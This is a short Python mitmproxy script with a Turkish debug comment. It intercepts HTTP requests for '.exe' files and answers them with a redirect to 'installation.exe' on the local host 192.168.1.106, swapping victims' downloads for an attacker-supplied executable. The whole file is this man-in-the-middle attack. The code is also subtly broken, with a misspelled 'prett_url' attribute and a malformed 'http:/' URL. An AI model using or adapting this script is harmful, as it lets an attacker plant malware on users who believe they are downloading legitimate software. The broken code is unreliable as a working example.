import mitmproxy

def request(flow):
	if flow.request.host !="192.168.1.106" and flow.request.prett_url.endswith(".exe"):
		flow.response = mitmproxy.http.Response.make(301,{"location":"http:/192.168.1.106/installation.exe"})
	
	

#def response(flow):
#	print("Gelen Cevaplar ......")
#	print(flow)
